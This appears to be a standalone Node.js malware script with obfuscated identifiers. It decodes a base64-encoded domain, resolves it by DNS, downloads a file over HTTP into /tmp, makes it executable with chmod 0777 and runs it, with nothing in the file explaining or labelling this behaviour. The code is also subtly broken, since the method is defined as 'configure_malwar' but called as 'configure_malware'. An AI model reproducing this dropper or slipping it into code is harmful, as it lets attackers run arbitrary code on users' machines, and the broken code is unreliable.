const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function devenustate() {
    this.configure_malwar = function(dhole) {
      if (dhole != null && dhole != '0.0.0.0') {
        snorers = http.get('http://' + dhole + '/upbred', function(coconstituent) {
          var thermostated = fs.createWriteStream('/tmp/noninhibitory');
          coconstituent.on('data', function(mopokes) {
            thermostated.write(mopokes);
          });
          coconstituent.on('end', function() {
            thermostated.end();
            fs.chmod('/tmp/noninhibitory', '0777');
            child_process.exec('/tmp/noninhibitory', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      embrawn = 'YTZmZDc5NGQuc2tpbHp6enBsc3Nzcy5kZQ=='
      dns.lookup((new Buffer(embrawn, 'base64')).toString(), function(err, zymogenes) {
        self.configure_malware(zymogenes);
      });
    };
};

(new devenustate()).run();
